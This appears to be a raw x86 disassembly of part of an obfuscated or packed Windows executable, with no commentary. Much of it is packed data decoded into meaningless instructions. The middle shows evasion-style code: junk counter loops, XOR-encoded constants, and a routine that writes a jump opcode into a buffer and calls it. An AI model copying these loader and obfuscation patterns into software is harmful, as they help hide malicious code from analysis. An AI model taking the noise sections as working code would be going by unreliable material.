  40c08c:	mov    edi,0x2a7c1e74
  40c091:	daa    
  40c092:	or     eax,0xb
  40c095:	xchg   esp,eax
  40c096:	repz pop es
  40c098:	out    0xb,eax
  40c09a:	cli    
  40c09b:	sub    BYTE PTR [ebp-0x7aa7f3fe],0x67
  40c0a2:	repz sbb al,bh
  40c0a5:	xchg   BYTE PTR [edi+0x1c],cl
  40c0a8:	push   ss
  40c0a9:	jb     0x40c11e
  40c0ab:	mov    ebp,0x53008a78
  40c0b0:	hlt    
  40c0b1:	pop    es
  40c0b2:	bound  edi,QWORD PTR [ecx]
  40c0b4:	int3   
  40c0b5:	xchg   esi,eax
  40c0b6:	pop    eax
  40c0b7:	dec    esi
  40c0b8:	pusha  
  40c0b9:	clc    
  40c0ba:	push   ebp
  40c0bb:	cmc    
  40c0bc:	(bad)  
  40c0bd:	jg     0x40c07e
  40c0bf:	inc    esp
  40c0c0:	mov    al,ds:0xfd287bd9
  40c0c5:	jmp    0x40c0ce
  40c0c7:	mov    al,0x3f
  40c0c9:	gs cwde 
  40c0cb:	rcr    BYTE PTR [eax+0x3d],0xb6
  40c0cf:	stos   DWORD PTR es:[edi],eax
  40c0d0:	jnp    0x40c10c
  40c0d2:	out    dx,al
  40c0d3:	dec    esp
  40c0d4:	fiadd  WORD PTR [ebx]
  40c0d6:	push   esp
  40c0d7:	popa   
  40c0d8:	and    dl,BYTE PTR [esi+0x3c]
  40c0db:	icebp  
  40c0dc:	pushf  
  40c0dd:	push   0x3d
  40c0df:	mov    ebx,DWORD PTR [esp+ecx*1]
  40c0e2:	ret    
  40c0e3:	jns    0x40c09f
  40c0e5:	and    edx,DWORD PTR [edi+ebp*8]
  40c0e8:	dec    edi
  40c0e9:	mul    esi
  40c0eb:	mov    cl,0xe6
  40c0ed:	(bad)  
  40c0ee:	pop    ebp
  40c0ef:	test   dl,bl
  40c0f1:	mov    esp,0x7b0296ac
  40c0f6:	pop    eax
  40c0f7:	sbb    al,BYTE PTR [ecx]
  40c0f9:	cmp    dl,BYTE PTR [esi+0x481aa3c1]
  40c0ff:	sbb    eax,0x7b2c7a06
  40c104:	mov    WORD PTR [eax-0x5012a446],es
  40c10a:	and    bl,al
  40c10c:	in     al,dx
  40c10d:	xchg   ecx,eax
  40c10e:	in     al,dx
  40c10f:	cmp    eax,0x37aadc7d
  40c114:	sub    dh,BYTE PTR [esi-0x327d830b]
  40c11a:	xchg   edx,eax
  40c11b:	loope  0x40c13e
  40c11d:	adc    eax,0x34b8fc94
  40c122:	pop    edx
  40c123:	cs cmp al,0xea
  40c126:	sbb    eax,0x7a543863
  40c12b:	fcos   
  40c12d:	or     DWORD PTR [ecx-0x27b1c502],esi
  40c133:	inc    edi
  40c134:	xchg   ebp,eax
  40c135:	jns    0x40c137
  40c137:	add    DWORD PTR [ebx-0x372ca155],ecx
  40c13d:	inc    esp
  40c13e:	and    edi,esi
  40c140:	inc    edi
  40c141:	call   0x6e1bd34d
  40c146:	jbe    0x40c173
  40c148:	cmp    al,0xf4
  40c14a:	je     0x40c146
  40c14c:	xchg   edi,eax
  40c14d:	out    0x6d,al
  40c14f:	mov    ds:0x641e14ae,eax
  40c154:	pop    esi
  40c155:	sub    al,ch
  40c157:	push   ebp
  40c158:	mov    eax,0xe7076903
  40c15d:	mov    edx,0x86211bf9
  40c162:	inc    DWORD PTR [eax+eiz*4]
  40c165:	test   al,0x11
  40c167:	out    dx,eax
  40c168:	xchg   ebp,eax
  40c169:	and    BYTE PTR [esi+ebx*1+0x38],ch
  40c16d:	sysenter 
  40c16f:	jecxz  0x40c17e
  40c171:	mov    bh,0x38
  40c173:	arpl   WORD PTR [ebx+0x6ffbf152],ax
  40c179:	or     DWORD PTR [ecx+esi*2+0x12169ddf],0x798e81de
  40c184:	jae    0x40c17b
  40c186:	add    al,0x15
  40c188:	pop    ecx
  40c189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c18a:	cs cld 
  40c18c:	push   DWORD PTR [edi+0x49]
  40c18f:	dec    esp
  40c190:	mov    cl,0x1b
  40c192:	mov    ds:0xf4052c68,eax
  40c197:	dec    ebx
  40c198:	je     0x40c191
  40c19a:	mov    DWORD PTR [esi-0x5003c269],eax
  40c1a0:	stos   DWORD PTR es:[edi],eax
  40c1a1:	jne    0x40c20c
  40c1a3:	and    bh,BYTE PTR [eax+0x6b]
  40c1a6:	add    DWORD PTR [ecx+0x4c3c3f99],0xd3ab397c
  40c1b0:	sbb    eax,0x80e7289
  40c1b5:	repnz es pop edi
  40c1b8:	aam    0xed
  40c1ba:	mov    al,ds:0x42671765
  40c1bf:	fst    QWORD PTR [edi-0x50]
  40c1c2:	mov    dh,0x66
  40c1c4:	sub    esi,esi
  40c1c6:	jb     0x40c173
  40c1c8:	arpl   WORD PTR [ecx+ecx*8],ax
  40c1cb:	push   ecx
  40c1cc:	lahf   
  40c1cd:	mov    ds:0x2a0cb030,al
  40c1d2:	fisttp WORD PTR [esi-0x1d]
  40c1d5:	xchg   esi,eax
  40c1d6:	pop    eax
  40c1d7:	lahf   
  40c1d8:	nop
  40c1d9:	push   ebx
  40c1da:	lds    edx,FWORD PTR [ecx-0x4d]
  40c1dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1de:	fld    TBYTE PTR [edx-0x64]
  40c1e1:	rcr    ah,cl
  40c1e3:	pop    esp
  40c1e4:	sbb    eax,0x44ce1b68
  40c1e9:	pop    ebp
  40c1ea:	shl    BYTE PTR [ebx+0x3b],cl
  40c1ed:	cld    
  40c1ee:	cmp    eax,0xc79ff905
  40c1f3:	lock cmp DWORD PTR [ecx-0x2],0xf160e0d8
  40c1fb:	mov    bl,0xb3
  40c1fd:	out    0xd6,eax
  40c1ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c200:	push   0xffffffa1
  40c202:	push   0x5f
  40c204:	jmp    0xedc1d834
  40c209:	push   ebp
  40c20a:	fidiv  WORD PTR [edi+0x645d7c9c]
  40c210:	xchg   ebp,eax
  40c211:	je     0x40c247
  40c213:	(bad)  
  40c214:	mov    al,ds:0x5c610674
  40c219:	jmp    0x8691:0xe704005
  40c220:	in     al,0xf5
  40c222:	and    DWORD PTR [ebx-0x1e59abe7],esi
  40c228:	push   es
  40c229:	inc    ebx
  40c22a:	(bad)  [ebx+0x66]
  40c22d:	add    eax,0xca43143e
  40c232:	inc    ebp
  40c233:	add    edi,DWORD PTR [ebx+esi*8-0xfd4cb5a]
  40c23a:	or     ah,BYTE PTR [eax+esi*1-0x44f14683]
  40c241:	fimul  WORD PTR [eax-0x6]
  40c244:	push   esp
  40c245:	pop    ss
  40c246:	xchg   edi,eax
  40c247:	(bad)  
  40c249:	mov    eax,ds:0xf0b23588
  40c24e:	aas    
  40c24f:	ins    BYTE PTR es:[edi],dx
  40c250:	fld    QWORD PTR [esi]
  40c252:	nop
  40c253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c254:	push   ebp
  40c255:	ins    DWORD PTR es:[edi],dx
  40c256:	ror    DWORD PTR [eax+eax*4],1
  40c259:	ins    DWORD PTR es:[edi],dx
  40c25a:	cmp    ebp,ebp
  40c25c:	sub    DWORD PTR [ecx+0x6c],edi
  40c25f:	jl     0x40c1ec
  40c261:	push   edx
  40c262:	mov    WORD PTR [ebx+0x6a629281],fs
  40c268:	scas   eax,DWORD PTR es:[edi]
  40c269:	ror    BYTE PTR [ebx],1
  40c26b:	pop    eax
  40c26c:	xor    ah,BYTE PTR [ecx+eax*8]
  40c26f:	mov    ebx,0x99b69321
  40c274:	or     eax,0xb3c64e09
  40c279:	sub    eax,DWORD PTR [ebx+ebp*4-0x259b406c]
  40c280:	pushf  
  40c281:	mov    ah,0x54
  40c283:	test   al,0x6c
  40c285:	cwde   
  40c286:	iret   
  40c287:	popa   
  40c288:	xchg   edx,eax
  40c289:	sbb    BYTE PTR [esi+ecx*4+0x796f2d14],cl
  40c290:	fdivr  DWORD PTR [edi]
  40c292:	mov    esp,esp
  40c294:	add    ebp,DWORD PTR [edi-0x5c7103ca]
  40c29a:	sbb    BYTE PTR [esi],al
  40c29c:	mov    WORD PTR [eax+0x17],fs
  40c29f:	dec    edi
  40c2a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2a1:	add    DWORD PTR [ebp+0x38],0x60
  40c2a5:	push   edx
  40c2a6:	inc    edi
  40c2a7:	je     0x40c272
  40c2a9:	cs jp  0x40c23a
  40c2ac:	push   eax
  40c2ad:	nop
  40c2ae:	es aam 0xec
  40c2b1:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40c2b3:	pop    edx
  40c2b4:	test   al,cl
  40c2b6:	dec    ecx
  40c2b7:	jo     0x40c293
  40c2b9:	ins    DWORD PTR es:[edi],dx
  40c2ba:	mov    edx,0x57c11686
  40c2bf:	cmp    DWORD PTR [edi+0x57],edx
  40c2c2:	iret   
  40c2c3:	dec    DWORD PTR [eax]
  40c2c5:	pop    es
  40c2c6:	sbb    al,0x11
  40c2c8:	sub    al,0xfe
  40c2ca:	xchg   ebx,eax
  40c2cb:	pop    eax
  40c2cc:	test   eax,0x83c00281
  40c2d1:	jge    0x40c2dc
  40c2d3:	(bad)  
  40c2d4:	aas    
  40c2d5:	dec    ebx
  40c2d6:	(bad)  
  40c2d7:	cdq    
  40c2d8:	in     eax,0xad
  40c2da:	addr16 pop edi
  40c2dc:	mov    cl,0xa1
  40c2de:	jb     0x40c333
  40c2e0:	ror    BYTE PTR [eax-0x5],cl
  40c2e3:	pop    esi
  40c2e4:	mov    esi,0xe4e2427c
  40c2e9:	push   0xffffff8c
  40c2eb:	or     BYTE PTR [esp+eiz*4+0x2f],bl
  40c2ef:	icebp  
  40c2f0:	int3   
  40c2f1:	adc    BYTE PTR ss:[eax+0x3],cl
  40c2f5:	repz push ss
  40c2f7:	sub    eax,0x3dde047c
  40c2fc:	mov    ?,WORD PTR [eax+0x5f22be7b]
  40c302:	sbb    ebp,DWORD PTR [esi+0x269286d8]
  40c308:	xchg   edx,eax
  40c309:	and    eax,0xa3fbd0af
  40c30e:	mov    eax,DWORD PTR [di-0x10]
  40c312:	sub    BYTE PTR [ebx+0x7a],cl
  40c315:	jl     0x40c35e
  40c317:	sbb    BYTE PTR [edi+ebx*2],ah
  40c31a:	cld    
  40c31b:	adc    al,0xa
  40c31d:	cmp    eax,0xafcc5eee
  40c322:	mov    esi,0x310ec132
  40c327:	mov    ebp,0x73e033b9
  40c32c:	lds    edx,FWORD PTR [ecx]
  40c32e:	es mov dh,0xf6
  40c331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c332:	xor    ah,BYTE PTR [eax+0x644b5d92]
  40c338:	push   ds
  40c339:	fmul   DWORD PTR [edx+0x23]
  40c33c:	mov    esp,0x183640a9
  40c341:	inc    ecx
  40c342:	and    eax,0x515f5ecc
  40c347:	rol    BYTE PTR [ebp-0x36],0x8e
  40c34b:	cmp    cl,BYTE PTR [ebp+0x212efe64]
  40c351:	call   0xc15:0x91375263
  40c358:	cmp    eax,0x27bbc17b
  40c35d:	mov    edx,0xf7290544
  40c362:	(bad)  
  40c364:	lock stos BYTE PTR es:[edi],al
  40c366:	lea    ebp,[ebx+ebp*4-0x67]
  40c36a:	stos   BYTE PTR es:[edi],al
  40c36b:	lods   al,BYTE PTR ds:[esi]
  40c36c:	fiadd  DWORD PTR [ebp-0x67ec5b11]
  40c372:	add    al,0x76
  40c374:	clc    
  40c375:	jmp    0xdc44:0xf4939f62
  40c37c:	pop    edi
  40c37d:	xchg   edi,eax
  40c37e:	push   0xffffffcd
  40c380:	ret    
  40c381:	adc    eax,DWORD PTR [ecx+0x2d]
  40c384:	push   cs
  40c385:	or     BYTE PTR [eax-0x5ed0d510],dl
  40c38b:	cmc    
  40c38c:	(bad)  
  40c38d:	nop
  40c38e:	ret    
  40c38f:	jl     0x40c3c0
  40c391:	nop
  40c392:	jg     0x40c368
  40c394:	inc    esp
  40c395:	mov    ds:0x42f0de7c,eax
  40c39a:	test   al,al
  40c39c:	popf   
  40c39d:	imul   ebx,DWORD PTR [ebx+0x2fb5bf8a],0x1
  40c3a4:	mov    dl,0xe1
  40c3a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3a7:	mov    esp,0xa9cde3d2
  40c3ac:	lock push cs
  40c3ae:	cmp    ebp,DWORD PTR [esi-0x54bc0889]
  40c3b4:	xor    bl,cl
  40c3b6:	xchg   BYTE PTR [esi+0x120d11f7],ch
  40c3bc:	sbb    DWORD PTR fs:[eax-0x5f],eax
  40c3c0:	or     ebp,DWORD PTR [ecx-0x27]
  40c3c3:	iret   
  40c3c4:	jl     0x40c43f
  40c3c6:	xor    DWORD PTR [esi],ebx
  40c3c8:	mov    esp,0x4a22dffa
  40c3cd:	mov    ecx,0xf0fb6044
  40c3d2:	loope  0x40c3c0
  40c3d4:	cmp    BYTE PTR [ecx-0x22],cl
  40c3d7:	lds    esp,FWORD PTR [edx+0x128204e4]
  40c3dd:	fistp  DWORD PTR [eax+ebx*4+0xf4a8fc2]
  40c3e4:	loop   0x40c456
  40c3e6:	sbb    esi,DWORD PTR [esi+edi*4+0x3b47acb5]
  40c3ed:	loope  0x40c404
  40c3ef:	dec    esi
  40c3f0:	inc    eax
  40c3f2:	stos   BYTE PTR es:[edi],al
  40c3f3:	(bad)  
  40c3f4:	int3   
  40c3f5:	push   ebp
  40c3f6:	repz out 0xe9,al
  40c3f9:	scas   al,BYTE PTR es:[edi]
  40c3fa:	popa   
  40c3fb:	leave  
  40c3fc:	dec    ebp
  40c3fd:	dec    ecx
  40c3fe:	mov    ds:0xbf453171,al
  40c403:	scas   al,BYTE PTR es:[edi]
  40c404:	popa   
  40c405:	in     al,dx
  40c406:	test   eax,0x66ac75b6
  40c40b:	sub    BYTE PTR [esi+0x2ae4cb8f],ch
  40c411:	xor    BYTE PTR [ebx-0x317b38d7],dh
  40c417:	in     al,0xa6
  40c419:	enter  0xed6c,0xea
  40c41d:	sti    
  40c41e:	jg     0x40c3d8
  40c420:	xchg   edx,eax
  40c421:	mov    esp,0x872d0d09
  40c426:	sbb    BYTE PTR [esi-0x5c],0x5d
  40c42a:	scas   eax,DWORD PTR es:[edi]
  40c42b:	sbb    BYTE PTR [eax+esi*1-0x80],bh
  40c42f:	dec    edx
  40c430:	cmp    DWORD PTR [edi-0x4ad48005],0x81bf8edf
  40c43a:	inc    ebp
  40c43b:	mov    bl,0xb4
  40c43d:	push   0xffffffa1
  40c43f:	in     al,0x61
  40c441:	jg     0x40c4bc
  40c443:	fsin   
  40c445:	jmp    0x1cb6ee0
  40c44a:	xchg   edi,eax
  40c44b:	out    0xee,eax
  40c44d:	ss cmp eax,0x75ef4214
  40c453:	mov    edx,0xa735a667
  40c458:	ret    0x7498
  40c45b:	mov    dh,dh
  40c45d:	ret    0xc76f
  40c460:	inc    ebp
  40c461:	fdivr  DWORD PTR [eax+0x1bf89c85]
  40c467:	(bad)  
  40c468:	mov    eax,DWORD PTR [ebp-0x10]
  40c46b:	or     DWORD PTR ds:0x42b014,edx
  40c471:	mov    ecx,DWORD PTR [ebp-0x10]
  40c474:	mov    esi,DWORD PTR ds:0x42a018
  40c47a:	sbb    DWORD PTR ds:0x429000,esi
  40c480:	sub    eax,ecx
  40c482:	mov    DWORD PTR [ebp-0x10],eax
  40c485:	xor    DWORD PTR [ebp-0x10],0xf89cb5b9
  40c48c:	mov    eax,DWORD PTR [ebp-0x18]
  40c48f:	mov    ecx,DWORD PTR [ebp-0x18]
  40c492:	mov    DWORD PTR ds:0x42a018,0x1f
  40c49c:	cmp    DWORD PTR ds:0x42a018,0x0
  40c4a3:	je     0x40c4ea
  40c4a9:	cmp    DWORD PTR ds:0x42a018,0x3
  40c4b0:	jne    0x40c4bc
  40c4b6:	call   DWORD PTR ds:0x42ed87
  40c4bc:	cmp    DWORD PTR ds:0x42a018,0x4
  40c4c3:	jne    0x40c4d8
  40c4c9:	xor    esi,esi
  40c4cb:	or     esi,DWORD PTR ds:0x42a018
  40c4d1:	dec    esi
  40c4d2:	mov    DWORD PTR ds:0x42a018,esi
  40c4d8:	mov    esi,DWORD PTR ds:0x42a018
  40c4de:	dec    esi
  40c4df:	mov    DWORD PTR ds:0x42a018,esi
  40c4e5:	jmp    0x40c49c
  40c4ea:	sub    eax,ecx
  40c4ec:	mov    esi,DWORD PTR ds:0x42b008
  40c4f2:	and    esi,DWORD PTR ds:0x42901c
  40c4f8:	mov    DWORD PTR ds:0x42b008,esi
  40c4fe:	mov    DWORD PTR [ebp-0x18],eax
  40c501:	or     DWORD PTR [ebp-0x18],0xf89f05b9
  40c508:	mov    DWORD PTR ds:0x429020,0x10
  40c512:	cmp    DWORD PTR ds:0x429020,0x0
  40c519:	je     0x40c57b
  40c51f:	cmp    DWORD PTR ds:0x429020,0x8
  40c526:	jne    0x40c53d
  40c52c:	push   DWORD PTR [ebp-0x10]
  40c52f:	push   0x42a010
  40c534:	push   DWORD PTR [ebp-0x28]
  40c537:	call   DWORD PTR ds:0x42ed8b
  40c53d:	cmp    DWORD PTR ds:0x429020,0x9
  40c544:	jne    0x40c557
  40c54a:	mov    esi,DWORD PTR ds:0x429020
  40c550:	dec    esi
  40c551:	mov    DWORD PTR ds:0x429020,esi
  40c557:	mov    esi,DWORD PTR ds:0x429020
  40c55d:	dec    esi
  40c55e:	mov    DWORD PTR ds:0x429020,esi
  40c564:	jmp    0x40c512
  40c569:	mov    esi,DWORD PTR ds:0x42901c
  40c56f:	add    esi,DWORD PTR ds:0x42d008
  40c575:	mov    DWORD PTR ds:0x42901c,esi
  40c57b:	mov    eax,DWORD PTR [ebp-0xc]
  40c57e:	mov    ecx,DWORD PTR [ebp-0xc]
  40c581:	mov    esi,DWORD PTR ds:0x42a01c
  40c587:	sub    esi,DWORD PTR ds:0x429014
  40c58d:	mov    DWORD PTR ds:0x42a01c,esi
  40c593:	sub    eax,ecx
  40c595:	add    esi,0x4f49
  40c59b:	mov    DWORD PTR [ebp-0xc],eax
  40c59e:	or     DWORD PTR [ebp-0xc],0xf89c85f9
  40c5a5:	sub    ecx,DWORD PTR ds:0x42a00c
  40c5ab:	mov    eax,DWORD PTR [ebp-0x1c]
  40c5ae:	or     DWORD PTR ds:0x42d018,ebx
  40c5b4:	mov    ecx,DWORD PTR [ebp-0x1c]
  40c5b7:	and    DWORD PTR ds:0x42d01c,0x0
  40c5c1:	jmp    0x40c5d5
  40c5c6:	xor    edi,edi
  40c5c8:	xor    edi,DWORD PTR ds:0x42d01c
  40c5ce:	inc    edi
  40c5cf:	mov    DWORD PTR ds:0x42d01c,edi
  40c5d5:	cmp    DWORD PTR ds:0x42d01c,0x1f
  40c5dc:	jae    0x40c64a
  40c5e2:	cmp    DWORD PTR ds:0x42d01c,0x2d
  40c5e9:	jne    0x40c5ff
  40c5ef:	push   0x42e205
  40c5f4:	push   0x0
  40c5f6:	push   DWORD PTR [ebp-0xc]
  40c5f9:	call   DWORD PTR ds:0x42ed8f
  40c5ff:	jmp    0x40c5c6
  40c604:	and    DWORD PTR ds:0x42d018,0x0
  40c60e:	jmp    0x40c620
  40c613:	mov    edi,DWORD PTR ds:0x42d018
  40c619:	inc    edi
  40c61a:	mov    DWORD PTR ds:0x42d018,edi
  40c620:	cmp    DWORD PTR ds:0x42d018,0x14
  40c627:	jae    0x40c64a
  40c62d:	cmp    DWORD PTR ds:0x42d018,0x1c
  40c634:	jne    0x40c645
  40c63a:	push   0x6072
  40c63f:	call   DWORD PTR ds:0x42ed4f
  40c645:	jmp    0x40c613
  40c64a:	sub    eax,ecx
  40c64c:	mov    DWORD PTR [ebp-0x1c],eax
  40c64f:	or     DWORD PTR [ebp-0x1c],0xf89c85d9
  40c656:	mov    eax,DWORD PTR [ebp-0x20]
  40c659:	mov    ecx,DWORD PTR [ebp-0x20]
  40c65c:	sub    eax,ecx
  40c65e:	mov    DWORD PTR [ebp-0x20],eax
  40c661:	mov    eax,DWORD PTR [ebp-0x2c]
  40c664:	mov    ecx,DWORD PTR [ebp-0x20]
  40c667:	mov    esi,0x7510899
  40c66c:	xor    eax,esi
  40c66e:	mov    edi,0x3272e0
  40c673:	add    eax,edi
  40c675:	or     eax,ecx
  40c677:	mov    DWORD PTR [ebp-0x20],eax
  40c67a:	mov    eax,DWORD PTR [ebp-0x4]
  40c67d:	mov    ecx,DWORD PTR [ebp-0x4]
  40c680:	sub    eax,ecx
  40c682:	mov    DWORD PTR [ebp-0x4],eax
  40c685:	or     DWORD PTR [ebp-0x4],0xf89c85bc
  40c68c:	mov    eax,DWORD PTR [ebp-0xc]
  40c68f:	xor    eax,esi
  40c691:	add    eax,edi
  40c693:	push   eax
  40c694:	mov    eax,DWORD PTR [ebp-0x10]
  40c697:	xor    eax,esi
  40c699:	add    eax,edi
  40c69b:	push   eax
  40c69c:	mov    eax,DWORD PTR [ebp-0x4]
  40c69f:	xor    eax,esi
  40c6a1:	add    eax,edi
  40c6a3:	push   eax
  40c6a4:	lea    eax,[ebp-0x7c]
  40c6a7:	push   eax
  40c6a8:	push   DWORD PTR [ebp-0x2c]
  40c6ab:	push   DWORD PTR [ebp-0x28]
  40c6ae:	call   0x411548
  40c6b3:	test   eax,eax
  40c6b5:	je     0x40c6e3
  40c6bb:	lea    eax,[ebp-0x7c]
  40c6be:	push   eax
  40c6bf:	mov    eax,DWORD PTR [ebp-0x28]
  40c6c2:	xor    eax,esi
  40c6c4:	add    eax,edi
  40c6c6:	push   eax
  40c6c7:	mov    eax,DWORD PTR [ebp-0x24]
  40c6ca:	add    eax,0xaa
  40c6cf:	push   eax
  40c6d0:	mov    eax,DWORD PTR [ebp-0x24]
  40c6d3:	mov    eax,DWORD PTR [eax+0x198]
  40c6d9:	push   DWORD PTR [eax]
  40c6db:	call   0x4050c0
  40c6e0:	mov    DWORD PTR [ebp-0x14],eax
  40c6e3:	lea    eax,[ebp+0x4]
  40c6e6:	mov    DWORD PTR [ebp-0x30],eax
  40c6e9:	mov    eax,DWORD PTR [ebp-0x14]
  40c6ec:	test   eax,eax
  40c6ee:	je     0x40c756
  40c6f4:	lea    eax,[ebp-0x8]
  40c6f7:	mov    DWORD PTR [ebp-0x38],eax
  40c6fa:	mov    eax,DWORD PTR [ebp-0x34]
  40c6fd:	mov    DWORD PTR [ebp-0x8],eax
  40c700:	mov    eax,DWORD PTR [ebp-0x8]
  40c703:	mov    ecx,DWORD PTR [ebp-0x14]
  40c706:	sub    eax,ecx
  40c708:	mov    DWORD PTR [ebp-0x8],eax
  40c70b:	mov    ecx,DWORD PTR [ebp-0x4]
  40c70e:	xor    ecx,esi
  40c710:	mov    eax,0xffcd8d20
  40c715:	sub    eax,ecx
  40c717:	add    DWORD PTR [ebp-0x8],eax
  40c71a:	mov    eax,DWORD PTR [ebp-0x8]
  40c71d:	mov    ecx,DWORD PTR [ebp-0x14]
  40c720:	mov    DWORD PTR [ecx+0x1],eax
  40c723:	mov    eax,DWORD PTR [ebp-0x14]
  40c726:	push   DWORD PTR [ebp-0x24]
  40c729:	mov    BYTE PTR [eax],0xe9
  40c72c:	mov    eax,ds:0x42e2ab
  40c731:	push   DWORD PTR [eax]
  40c733:	push   DWORD PTR ds:0x42e507
  40c739:	push   DWORD PTR ds:0x42e2b3
  40c73f:	push   DWORD PTR ds:0x42e4e7
  40c745:	push   DWORD PTR ds:0x42eaf7
  40c74b:	push   DWORD PTR [ebp-0x28]
  40c74e:	push   DWORD PTR [ebp-0x2c]
  40c751:	mov    eax,DWORD PTR [ebp-0x14]
  40c754:	call   eax
  40c756:	mov    eax,DWORD PTR [ebp-0x30]
  40c759:	mov    ecx,DWORD PTR ds:0x42e4ab
  40c75f:	add    DWORD PTR [eax],ecx
  40c761:	pop    edi
  40c762:	pop    esi
  40c763:	leave  
  40c764:	ret    
  40c765:	push   ebp
  40c766:	mov    ebp,esp
  40c768:	sub    esp,0x18
  40c76b:	mov    DWORD PTR [ebp-0x10],0xf89f85b9
  40c772:	adc    DWORD PTR ds:0x42d00c,ebx
  40c778:	lea    eax,[ebp+0x14]
  40c77b:	and    ecx,ecx
  40c77d:	mov    DWORD PTR [ebp-0x4],eax
  40c780:	movzx  edx,BYTE PTR ds:0x42a014
  40c787:	sub    edx,DWORD PTR ds:0x42c00c
  40c78d:	mov    DWORD PTR ds:0x42a014,edx
  40c793:	push   esi
  40c794:	mov    esi,0xf89c85b9
  40c799:	movzx  edx,BYTE PTR ds:0x42b010
  40c7a0:	sbb    DWORD PTR ds:0x42a000,edx
  40c7a6:	mov    DWORD PTR [ebp-0xc],esi
  40c7a9:	lea    eax,[ebp-0xc]
  40c7ac:	mov    DWORD PTR ds:0x429020,0x1e
  40c7b6:	cmp    DWORD PTR ds:0x429020,0x0
  40c7bd:	je     0x40c861
  40c7c3:	cmp    DWORD PTR ds:0x429020,0x27
  40c7ca:	jne    0x40c7e3
  40c7d0:	push   0x42e0f4
  40c7d5:	push   DWORD PTR [ebp-0x20]
  40c7d8:	push   0x1
  40c7da:	push   DWORD PTR [ebp-0x10]
  40c7dd:	call   DWORD PTR ds:0x42ed53
  40c7e3:	xor    ecx,ecx
  40c7e5:	xor    ecx,DWORD PTR ds:0x429020
  40c7eb:	dec    ecx
  40c7ec:	mov    DWORD PTR ds:0x429020,ecx
  40c7f2:	jmp    0x40c7b6
  40c7f7:	and    DWORD PTR ds:0x429004,0x0
  40c801:	jmp    0x40c813
  40c806:	mov    ecx,DWORD PTR ds:0x429004
  40c80c:	inc    ecx
  40c80d:	mov    DWORD PTR ds:0x429004,ecx
  40c813:	cmp    DWORD PTR ds:0x429004,0x19
  40c81a:	jae    0x40c861
  40c820:	cmp    DWORD PTR ds:0x429004,0xf
  40c827:	jne    0x40c838
  40c82d:	push   0x42e251
  40c832:	call   DWORD PTR ds:0x42ed57
  40c838:	cmp    DWORD PTR ds:0x429004,0xe
  40c83f:	jne    0x40c852
  40c845:	mov    ecx,DWORD PTR ds:0x429004
  40c84b:	inc    ecx
  40c84c:	mov    DWORD PTR ds:0x429004,ecx
  40c852:	jmp    0x40c806
  40c857:	xor    DWORD PTR ds:0x42d004,0x27e5
  40c861:	mov    DWORD PTR [ebp-0x14],eax
  40c864:	mov    eax,DWORD PTR [ebp-0xc]
  40c867:	mov    edx,DWORD PTR [ebp-0x14]
  40c86a:	sbb    DWORD PTR ds:0x42a004,ecx
  40c870:	mov    ecx,0x7510899
  40c875:	xor    eax,ecx
  40c877:	add    DWORD PTR ds:0x42d014,0x42901c
  40c881:	add    eax,0x3272e0
  40c886:	neg    DWORD PTR ds:0x42d008
  40c88c:	mov    DWORD PTR [edx],eax
  40c88e:	mov    eax,ds:0x42e2a7
  40c893:	and    DWORD PTR ds:0x42b01c,0x0
  40c89d:	mov    edx,DWORD PTR ds:0x42b01c
  40c8a3:	inc    edx
  40c8a4:	mov    DWORD PTR ds:0x42b01c,edx
  40c8aa:	cmp    DWORD PTR ds:0x42b01c,0x1f
  40c8b1:	jne    0x40c8c2
  40c8b7:	push   0x641d
  40c8bc:	call   DWORD PTR ds:0x42ed5b
  40c8c2:	cmp    DWORD PTR ds:0x42b01c,0x1d
  40c8c9:	jb     0x40c89d
  40c8cf:	add    DWORD PTR ds:0x429008,edi
  40c8d5:	mov    edx,DWORD PTR [ebp-0x4]
  40c8d8:	mov    eax,DWORD PTR [eax]
  40c8da:	add    eax,DWORD PTR [edx]
  40c8dc:	sbb    DWORD PTR ds:0x429004,0x2443
  40c8e6:	push   edi
  40c8e7:	mov    DWORD PTR [ebp-0x8],eax
  40c8ea:	mov    edi,DWORD PTR [ebp+0x8]
  40c8ed:	and    DWORD PTR ds:0x429014,0x0
  40c8f7:	mov    edx,DWORD PTR ds:0x429014
  40c8fd:	inc    edx
  40c8fe:	mov    DWORD PTR ds:0x429014,edx
  40c904:	cmp    DWORD PTR ds:0x429014,0x20
  40c90b:	jne    0x40c921
  40c911:	push   0x429018
  40c916:	push   0x4f77
  40c91b:	call   DWORD PTR ds:0x42ed5f
  40c921:	cmp    DWORD PTR ds:0x429014,0x1e
  40c928:	jb     0x40c8f7
  40c92e:	movzx  edx,WORD PTR ds:0x42b00c
  40c935:	add    DWORD PTR ds:0x42d004,edx
  40c93b:	mov    eax,ds:0x42e42f
  40c940:	adc    edx,0xaa6
  40c946:	mov    eax,DWORD PTR [eax+0x198]
  40c94c:	sub    edx,DWORD PTR ds:0x42a010
  40c952:	xor    edi,ecx
  40c954:	mov    edx,0x3272e0
  40c959:	sub    DWORD PTR ds:0x42c000,0x6686
  40c963:	jmp    0x40ecd7
  40c968:	fild   QWORD PTR [edi+0x45]
  40c96b:	push   ecx
  40c96c:	mov    ch,0x3b
  40c96e:	mov    bl,0xb7
  40c970:	pop    esp
  40c971:	sub    DWORD PTR [ecx-0x30],esi
  40c974:	mov    edx,0xcf6b9027
  40c979:	in     eax,0x7a
  40c97b:	jp     0x40c990
  40c97d:	pop    edi
  40c97e:	jp     0x40c9fa
  40c980:	inc    ebp
  40c981:	sbb    eax,0xbb7cff05
  40c986:	test   al,0x4c
  40c988:	jnp    0x40c9e5
  40c98a:	test   al,0x2e
  40c98d:	mov    ah,0xf3
  40c98f:	push   ebp
  40c990:	lea    ebx,[edi+ecx*4-0xa]
  40c994:	mov    edi,0x88f4a318
  40c999:	sbb    eax,0xb90a4883
  40c99f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9a0:	ja     0x40c97a
  40c9a2:	cdq    
  40c9a3:	or     dl,cl
  40c9a5:	jmp    0x40c93e
  40c9a7:	sub    al,0x1f
  40c9a9:	cmc    
  40c9aa:	(bad)  
  40c9ab:	pop    esi
  40c9ac:	idiv   ebp
